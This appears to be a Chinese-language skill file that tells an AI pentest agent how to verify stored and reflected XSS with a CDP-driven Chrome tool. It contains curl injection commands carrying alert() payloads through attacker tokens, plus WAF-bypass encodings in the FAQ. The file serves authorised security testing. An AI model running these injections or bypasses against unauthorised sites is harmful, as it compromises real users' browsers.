---
name: xss-verify
description: 当需要验证 XSS 是否在受害者浏览器中真实执行时使用
disable-model-invocation: true
requirements:
  python_modules: [websocket]
  files: [scripts/detect.py]
---

## 多 Worker 隔离

工具默认**每次创建新 tab**，检测完自动关闭。多个 worker 同时运行 XSS 验证互不干扰。

不要手动指定 `--tab-index`（会复用已有 tab，与其他 worker 冲突），除非你确定没有其他 worker 在使用 Chrome-SecTest。

---

## 工具路径

检测脚本在本 Skill 目录下。Chrome 的启动和页面生命周期由 Explore 的 Browser Broker 管理，不再调用 browser-control 的启动/停止脚本。

用运行时解析器获取脚本，不依赖当前目录：

```bash
axiom skill path xss-verify
axiom skill path browser-control  # 仅用于确认指南目录；不调用其中的 scripts
```

依赖：`python3 + websocket-client`（已安装）

---

## 操作步骤

### Step 1：使用当前 Explore 的 Browser Tool

不要手动启动 Chrome 或直接访问 CDP。首次调用 `browser_open_page`、`browser_list_pages` 或其他 `browser_*` 工具时，Browser Broker 会自动连接或启动当前 Explore Lease 的 Chrome-SecTest。工具不可用时报告 Browser Broker 错误，不要回退到旧脚本。

### Step 2：运行检测工具

```bash
python3 "$(axiom skill path xss-verify)/scripts/detect.py" \
  "https://target.example.com/victim-page" \
  --timeout 8 \
  --cdp-port 9223
```

工具会自动：
1. 在 Chrome-SecTest 中创建新 tab
2. 导航到受害者页面 URL
3. 等待 alert dialog（默认 8 秒）
4. 关闭 tab（无论是否触发）

### Step 3：判定结果

| 退出码 | 含义 |
|--------|------|
| `0` | dialog 触发，`dialog_message` 已输出到 stdout，核对是否与注入的 payload 匹配 |
| `1` | 未触发 dialog（检查页面 URL 是否正确、受害者视角是否能看到该字段） |
| `2` | 错误（Chrome 未运行、CDP 连接失败等） |

stdout 输出格式：`dialog_message='1'`（dialog 的原始消息内容）
stderr 输出：过程日志（创建 tab、导航、关闭 tab）

---

## 证据模板

```
【注入】PATCH /api/v1/xxx (attacker JWT) body={"field":"<img src=x onerror=alert(1)>"} → HTTP 200
【检测命令】python3 "$(axiom skill path xss-verify)/scripts/detect.py" "https://target/victim-page" --cdp-port 9223
【检测结果】exit 0 — dialog_message='1' ← 与注入的 alert(1) 匹配，XSS 真实执行确认
```

---

## 完整 XSS 验证流程

### 存储型 XSS

1. **注入 payload**：用攻击者账号通过 API 写入恶意内容
   ```bash
   curl -X PUT "https://target/api/profile" -H "Authorization: Bearer <attacker_token>" -d '{"name":"<img src=x onerror=alert(1)>"}'
   ```

2. **确认存储**：读取受害者视角，验证 payload 未被转义
   ```bash
   curl "https://target/api/profile" -H "Authorization: Bearer <victim_token>"
   # 确认返回的 name 字段含未转义的 <img src=x onerror=alert(1)>
   ```

3. **验证执行**：导航到受害者页面，检测 dialog
   ```bash
   python3 "$(axiom skill path xss-verify)/scripts/detect.py" "https://target/profile" --cdp-port 9223 --timeout 10
   ```

4. **判定**：exit 0 + dialog_message 与 payload 匹配 → XSS 确认

### 反射型 XSS

1. **构造 URL**：`https://target/search?q=<script>alert(1)</script>`
2. **验证执行**：
   ```bash
   python3 "$(axiom skill path xss-verify)/scripts/detect.py" "https://target/search?q=<script>alert(1)</script>" --cdp-port 9223
   ```

---

## 常见问题

| 问题 | 解决 |
|------|------|
| dialog 未弹出 | 确认是前端页面 URL，不是 API endpoint；确认受害者视角能看到含 payload 的字段；增加 `--timeout 15` |
| Chrome 未运行 | 直接调用 `browser_open_page` 让 Browser Broker 受控启动；不要执行旧启动脚本 |
| `--tab-index` 冲突 | 不要用 `--tab-index`，默认创建新 tab 即可 |
| 创建 tab 失败 | Chrome 可能 tab 数量过多，关闭一些不需要的 tab |
| payload 被 WAF 拦截 | 尝试编码绕过：`\u003cscript\u003e`、`<scr<script>ipt>` 等 |
